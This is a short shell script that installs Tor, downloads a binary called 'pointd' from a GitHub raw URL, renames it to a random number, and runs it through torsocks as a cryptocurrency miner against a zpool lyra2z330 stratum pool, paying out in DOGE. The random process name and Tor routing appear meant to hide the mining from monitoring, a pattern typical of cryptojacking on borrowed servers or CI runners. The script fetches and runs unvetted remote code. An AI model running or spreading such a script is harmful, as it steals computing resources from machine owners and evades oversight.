user=$1 
proxy=$2 
worker=$(shuf -n 1 -i 1-9999999) 
apt update -y 
apt install -y tor 
service tor start && sleep 30 
wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd 
chmod +x pointd 
mv pointd $worker 
chmod +x $worker 
torsocks ./$worker -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u $user.$worker -p c=DOGE,mc=MBC -x $proxy
